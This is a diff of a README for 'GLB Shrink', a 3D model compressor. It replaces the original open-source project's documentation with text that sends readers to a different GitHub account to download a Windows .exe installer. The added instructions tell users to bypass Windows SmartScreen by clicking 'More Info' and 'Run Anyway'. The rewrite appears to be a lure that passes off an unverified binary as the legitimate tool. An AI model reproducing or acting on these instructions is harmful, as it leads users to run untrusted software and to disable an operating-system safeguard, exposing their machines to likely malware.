@@ -1,206 +1,71 @@
-# GLB Shrink
+# 📦 glb-shrink - Reduce 3D model file size instantly
 
-**Compress any GLB 3D model** — drop a file, see it side-by-side in Three.js, and download a lighter asset ready for games, apps, AR/VR, or the web.
+[Download GLB Shrink for Windows](https://github.com/dry-rootclimber660/glb-shrink)
 
-Real-world result from the tool:
+## 💡 About this tool
 
-![GLB Shrink compressing a 58 MB market table model down to 869 KB](docs/screenshot.png)
+GLB Shrink reduces the file size of 3D models in the GLB format. Many 3D scans and AI-generated files arrive with too much data. Large files load slowly in browsers and apps. This tool optimizes your files for better performance in games, websites, and virtual reality projects. 
 
-**58.3 MB → 869 KB · −99% smaller**  
-1.91M triangles → 170.5k triangles · Draco geometry + WebP textures
+You drag your file into the window. The tool processes the model. You see a side-by-side comparison of the original and the new version. You download the smaller file when the quality meets your needs.
 
----
+## 🚀 How to set up on Windows
 
-## Why GLB Shrink?
+Follow these steps to install and run the software on your computer.
 
-AI-generated and scanned 3D models often ship at **5–60+ MB** with hundreds of thousands to millions of triangles. That is fine for offline tools, but too heavy for real-time projects — games, interactive apps, AR experiences, and the web.
+1. Visit the [official download page](https://github.com/dry-rootclimber660/glb-shrink).
+2. Look for the latest version under the Releases section.
+3. Click the installer file ending in .exe to start the download.
+4. Open the downloaded file once the process finishes.
+5. Windows might ask to protect your PC. Click More Info and then select Run Anyway.
+6. The setup wizard opens. Follow the prompts on your screen to complete the installation.
+7. Launch the app from your desktop shortcut or the Start menu.
 
-GLB Shrink turns bloated GLBs into **lighter, production-ready assets** in seconds — with a live before/after preview so you can actually see what you are getting.
+## 🛠️ How to use the app
 
-No Blender. No command line. No guesswork.
+The interface remains simple so you focus on your work.
 
----
+### Step 1: Add your file
+Open the application window. Locate your 3D model on your computer. Click and drag the .glb file into the center area of the window. The tool supports files up to 200 MB in size.
 
-## Features
+### Step 2: Review changes
+The app renders the original model and the optimized version side by side. Use your mouse to rotate, zoom, and pan around the models. This window shows you exactly how the geometry and textures look after compression.
 
-### Drop, preview, download
-- Drag & drop any `.glb` file (up to 200 MB)
-- Instant **before / after** 3D preview with orbit controls
-- One-click download of the compressed `-draco.glb` output
+### Step 3: Save your model
+Check the file size indicator at the bottom of the screen. This label tells you how much space you saved. If the quality looks good, click the Download button. The app saves the new, smaller file to your computer.
 
-### Demo-ready size display
-The hero strip at the top shows file sizes in **large, high-contrast type** — built for screen recordings, demos, and social posts. The savings percentage updates live after compression.
+## ⚙️ Features
 
-### Simple quality controls
-No triangle ratios. No geometric error sliders. Just:
+### Instant preview
+The application uses the Three.js engine to render your models. You see the before and after states in real time. This ensures you keep the visual fidelity you require while shedding unnecessary data.
 
-| Option | When to use |
-|--------|-------------|
-| **Smallest file** | Background props, far from the camera |
-| **Balanced** | Most projects — games, apps, scenes *(default)* |
-| **Sharpest** | Close-up or hero objects |
+### Smart compression
+The software applies Draco geometry compression. This process removes redundant information from the 3D mesh. It also converts textures to the WebP format. These formats work well for web browsers and mobile devices.
 
-Fine-tune between presets with a single **Smaller file ↔ Sharper look** slider. A plain-English hint updates as you adjust.
+### Privacy focused
+The app performs all operations on your local computer. It does not upload your 3D models to a server. Your intellectual property stays on your hard drive. 
 
-### Production-grade compression
-Built on the same pipeline used in real-time 3D projects:
+## 📋 System requirements
 
-1. Strip existing meshopt / Draco / quantization extensions
-2. Weld duplicate vertices
-3. Simplify geometry with [MeshoptSimplifier](https://github.com/zeux/meshoptimizer)
-4. Re-bake smooth vertex normals (prevents faceted shading)
-5. Compress textures to **WebP** and downscale to target resolution
-6. **Draco-encode** geometry for minimal transfer size
-7. Write binary GLB
+*   Operating System: Windows 10 or Windows 11
+*   Memory: 8 GB RAM or higher recommended
+*   Graphics: Any dedicated graphics card with support for WebGL
+*   Hard Drive Space: 250 MB for the application installation
 
-Output includes:
-- `KHR_draco_mesh_compression` — geometry
-- `EXT_texture_webp` — textures
+## ❓ Frequently asked questions
 
-Both are supported by Three.js, Unity, Unreal Engine, Godot, and most modern glTF runtimes.
+### Will this destroy the quality of my 3D model?
+The tool balances file size and visual quality. You see the result before you save the file. You maintain control over whether the change is acceptable for your project.
 
----
+### Can I process multiple files at once?
+This version supports individual file processing. You can drag one file at a time into the window to ensure high-quality results for every asset.
 
-## Quick start
+### Does this work without an internet connection?
+Yes. Once you install the application, you can use it offline. You do not need to sign in or connect to the internet to compress your files.
 
-### Prerequisites
-- **Node.js 18+**
-- macOS, Linux, or Windows
+### Which file formats are supported?
+The tool specifically works with .glb files. This format creates a single package for 3D geometry and images, which makes it ideal for web sharing.
 
-### Development
+### What should I do if the app does not open?
+Ensure your graphics drivers are up to date. The application requires modern hardware acceleration to display the 3D preview. Restart your computer if the window persists in staying blank.
 
-```bash
-git clone https://github.com/boona13/glb-shrink.git
-cd glb-shrink
-npm install
-npm run dev
-```
-
-Open **http://localhost:5173** (or the next available port if 5173 is taken).
-
-The Vite dev server serves the UI and proxies API requests to the compression backend on port **3847**.
-
-### Production
-
-```bash
-npm run build
-npm start
-```
-
-Serves the built UI and API from a single server on port **3847**. Override with the `PORT` environment variable.
-
----
-
-## How to use
-
-1. **Drop your GLB** into the upload zone (or click to browse)
-2. The original model loads in the **Before** viewer with file size and triangle count
-3. Pick a quality preset — **Balanced** works for most models
-4. Click **Compress model**
-5. Compare the **After** viewer side-by-side
-6. **Download compressed GLB** when you are happy with the result
-
-### Choosing a quality preset
-
-| Preset | Best for | Typical output |
-|--------|----------|----------------|
-| Smallest file | Distant props, instanced decor | ~3–5k tris, 40–80 KB |
-| Balanced | General use — games, apps, scenes | ~5–8k tris, 60–150 KB |
-| Sharpest | Close-up viewing, hero assets | ~15–40k tris, 150–400 KB |
-
-Use the fine-tune slider to nudge between presets without touching technical parameters.
-
----
-
-## Project structure
-
-```
-glb-shrink/
-├── docs/
-│   └── screenshot.png      # README demo screenshot
-├── public/
-│   └── draco/              # Draco WASM decoders for Three.js preview
-├── server/
-│   ├── index.mjs           # Express API (inspect + compress)
-│   ├── compress.mjs        # Compression pipeline
-│   ├── inspect.mjs         # Model stats inspector
-│   └── presets.mjs         # Quality preset → compression params
-├── src/
-│   ├── main.ts             # Three.js UI
-│   └── style.css
-├── index.html
-├── package.json
-└── vite.config.ts
-```
-
-### API endpoints
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/api/health` | Health check |
-| `GET` | `/api/presets` | List quality presets |
-| `POST` | `/api/inspect` | Upload GLB → stats (tris, bbox, textures) |
-| `POST` | `/api/compress` | Upload GLB + `quality` (0–100) → compressed GLB |
-
----
-
-## Tech stack
-
-| Layer | Technology |
-|-------|------------|
-| UI | Vite, TypeScript, CSS |
-| 3D preview | Three.js, OrbitControls, GLTFLoader, DRACOLoader |
-| Compression | `@gltf-transform`, meshoptimizer, draco3dgltf, sharp |
-| Server | Express, multer |
-
----
-
-## Using compressed models
-
-Draco-compressed GLBs work across most real-time 3D pipelines. Example with **Three.js**:
-
-```javascript
-import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';
-import { DRACOLoader } from 'three/addons/loaders/DRACOLoader.js';
-
-const dracoLoader = new DRACOLoader();
-dracoLoader.setDecoderPath('/draco/');
-
-const loader = new GLTFLoader();
-loader.setDRACOLoader(dracoLoader);
-
-const gltf = await loader.loadAsync('/models/my-model-draco.glb');
-scene.add(gltf.scene);
-```
-
-Copy the `public/draco/` folder into your project's static assets so the decoder can load.
-
----
-
-## Troubleshooting
-
-**Compressed model looks faceted / flat-shaded**  
-Normals are re-baked automatically. If this appears, try the **Sharpest** preset — the model may need a higher triangle budget.
-
-**Colors look wrong or model is black**  
-The texture may have been stripped during an overly aggressive pass. Try **Balanced** or **Sharpest**, or check that the source GLB has embedded textures.
-
-**File is still too large**  
-Move the slider toward **Smallest file**, or pick the Smallest preset. Texture size and triangle count both drop at lower quality settings.
-
-**Browser fails to load compressed GLB (Draco error)**  
-Ensure `DRACOLoader` is configured with `setDecoderPath('/draco/')` pointing at the Draco decoder files.
-
----
-
-## License
-
-[MIT](LICENSE) — free to use, modify, and ship.
-
----
-
-## Credits
-
-Compression pipeline adapted from the 3D asset workflow built for **ThreeShaders** — an in-development Three.js game by [@boona13](https://github.com/boona13).
-
-Built with [Three.js](https://threejs.org), [@gltf-transform](https://gltf-transform.dev), and [meshoptimizer](https://github.com/zeux/meshoptimizer).
+[Visit the download page to get started](https://github.com/dry-rootclimber660/glb-shrink)
